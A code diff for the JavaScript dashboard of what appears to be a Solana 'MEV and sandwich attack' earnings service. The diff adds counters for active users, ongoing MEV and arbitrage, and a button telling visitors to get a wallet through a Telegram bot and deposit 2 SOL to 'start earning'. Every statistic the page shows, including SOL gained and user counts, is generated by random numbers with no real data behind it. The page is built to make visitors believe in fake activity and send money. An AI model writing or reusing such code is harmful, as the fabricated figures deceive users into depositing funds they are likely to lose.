@@ -1,6 +1,9 @@
 let currentBalance = 0;
 let pooledSol = 10000; // Starting pooled SOL
 let sandwichAttacks = 0; // Starting sandwich attacks
+let activeUsers = 0;
+let ongoingMEV = 0;
+let ongoingArbitrage = 0;
 let startTime;
 let solGainedChart, solPooledChart, sandwichAttacksChart;
 let transactions = [];
@@ -22,14 +25,17 @@ function initializeApp() {
         currentBalance = Math.random() * (16000 - 145) + 145;
         pooledSol = 10000;
         sandwichAttacks = 0;
+        activeUsers = Math.floor(Math.random() * (30000 - 1900) + 1900);
+        ongoingMEV = Math.floor(Math.random() * 1000);
+        ongoingArbitrage = Math.floor(Math.random() * 500);
     }
-    updateTodayStats();
+    updateGlobalNexusStats();
     initializeWallet();
     updateMyGains();
     initializeTransactions();
     initializeStatsGraphs();
     explainChartLines();
-    showTab('today-stats'); // Show Today's Stats tab by default
+    showTab('global-nexus-stats'); // Show Global Nexus Stats tab by default
 }
 
 function loadSavedData() {
@@ -37,12 +43,18 @@ function loadSavedData() {
     const savedStartTime = localStorage.getItem('startTime');
     const savedPooledSol = localStorage.getItem('pooledSol');
     const savedSandwichAttacks = localStorage.getItem('sandwichAttacks');
-    if (savedBalance && savedStartTime && savedPooledSol && savedSandwichAttacks) {
+    const savedActiveUsers = localStorage.getItem('activeUsers');
+    const savedOngoingMEV = localStorage.getItem('ongoingMEV');
+    const savedOngoingArbitrage = localStorage.getItem('ongoingArbitrage');
+    if (savedBalance && savedStartTime && savedPooledSol && savedSandwichAttacks && savedActiveUsers && savedOngoingMEV && savedOngoingArbitrage) {
         currentBalance = parseFloat(savedBalance);
         startTime = new Date(parseInt(savedStartTime));
         pooledSol = parseFloat(savedPooledSol);
         sandwichAttacks = parseInt(savedSandwichAttacks);
-        console.log("Loaded saved data:", currentBalance, startTime, pooledSol, sandwichAttacks);
+        activeUsers = parseInt(savedActiveUsers);
+        ongoingMEV = parseInt(savedOngoingMEV);
+        ongoingArbitrage = parseInt(savedOngoingArbitrage);
+        console.log("Loaded saved data:", currentBalance, startTime, pooledSol, sandwichAttacks, activeUsers, ongoingMEV, ongoingArbitrage);
     }
 }
 
@@ -51,7 +63,10 @@ function saveData() {
     localStorage.setItem('startTime', startTime.getTime().toString());
     localStorage.setItem('pooledSol', pooledSol.toString());
     localStorage.setItem('sandwichAttacks', sandwichAttacks.toString());
-    console.log("Saved data:", currentBalance, startTime, pooledSol, sandwichAttacks);
+    localStorage.setItem('activeUsers', activeUsers.toString());
+    localStorage.setItem('ongoingMEV', ongoingMEV.toString());
+    localStorage.setItem('ongoingArbitrage', ongoingArbitrage.toString());
+    console.log("Saved data:", currentBalance, startTime, pooledSol, sandwichAttacks, activeUsers, ongoingMEV, ongoingArbitrage);
 }
 
 function updateApp() {
@@ -62,14 +77,17 @@ function updateApp() {
         currentBalance = Math.random() * (16000 - 145) + 145;
         pooledSol = 10000;
         sandwichAttacks = 0;
+        activeUsers = Math.floor(Math.random() * (30000 - 1900) + 1900);
+        ongoingMEV = Math.floor(Math.random() * 1000);
+        ongoingArbitrage = Math.floor(Math.random() * 500);
         transactions = [];
     } else {
-        updateTodayStats();
+        updateGlobalNexusStats();
     }
     saveData();
 }
 
-function updateTodayStats() {
+function updateGlobalNexusStats() {
     // Update SOL Gained (more dynamic)
     const gainFactor = Math.random() * 2 + 0.5; // Random factor between 0.5 and 2.5
     currentBalance += gainFactor * (Math.random() * 0.2 + 0.9); // More variation
@@ -83,8 +101,19 @@ function updateTodayStats() {
     const attackChange = Math.floor(Math.random() * 5) - 1; // Can decrease by 1, increase by up to 3
     sandwichAttacks = Math.max(0, sandwichAttacks + attackChange); // Ensure it doesn't go below 0
 
+    // Update new stats
+    activeUsers += Math.floor(Math.random() * 11) - 5; // Change by -5 to +5
+    activeUsers = Math.max(1900, Math.min(30000, activeUsers)); // Keep between 1900 and 30000
+    ongoingMEV += Math.floor(Math.random() * 21) - 10; // Change by -10 to +10
+    ongoingMEV = Math.max(0, ongoingMEV);
+    ongoingArbitrage += Math.floor(Math.random() * 11) - 5; // Change by -5 to +5
+    ongoingArbitrage = Math.max(0, ongoingArbitrage);
+
     console.log("Updating stats, current balance:", currentBalance.toFixed(2));
 
+    document.getElementById("active-users").innerHTML = `Active Users: <span>${activeUsers.toLocaleString()}</span>`;
+    document.getElementById("ongoing-mev").innerHTML = `Ongoing MEV: <span>${ongoingMEV.toLocaleString()}</span>`;
+    document.getElementById("ongoing-arbitrage").innerHTML = `Ongoing Arbitrage: <span>${ongoingArbitrage.toLocaleString()}</span>`;
     document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL Gained`;
     document.getElementById("pooled-sol").textContent = `${pooledSol.toFixed(2)} SOL Pooled`;
     document.getElementById("sandwich-attacks").textContent = `${sandwichAttacks} Sandwich Attacks`;
@@ -294,12 +323,13 @@ function updateChart(chart, now, value) {
 function explainChartLines() {
     const explanation = document.createElement('div');
     explanation.innerHTML = `
-        <p id="sol-balance" style="color: rgba(0, 255, 255, 1); font-size: 18px; font-weight: bold; margin-top: 10px;"></p>
-        <p id="pooled-sol" style="color: rgba(255, 0, 0, 1); font-size: 18px; font-weight: bold; margin-top: 5px;"></p>
-        <p id="sandwich-attacks" style="color: rgba(0, 255, 0, 1); font-size: 18px; font-weight: bold; margin-top: 5px;"></p>
         <p style="color: rgba(0, 255, 255, 0.7); font-size: 14px; margin-top: 10px;">The blue chart represents the SOL gained by all users collectively.</p>
         <p style="color: rgba(255, 0, 0, 0.7); font-size: 14px; margin-top: 5px;">The red chart represents the SOL pooled by all users together to perform MEV attacks. This pool fluctuates as users contribute and withdraw funds, and as MEV opportunities are exploited.</p>
         <p style="color: rgba(0, 255, 0, 0.7); font-size: 14px; margin-top: 5px;">The green chart represents the number of successful sandwich attacks performed.</p>
     `;
-    document.getElementById('today-stats').appendChild(explanation);
+    document.getElementById('global-nexus-stats').appendChild(explanation);
+}
+
+function getWallet() {
+    alert("To get your wallet address, please use the Telegram bot and type /get_wallet. Then deposit 2 SOL to start earning!");
 }
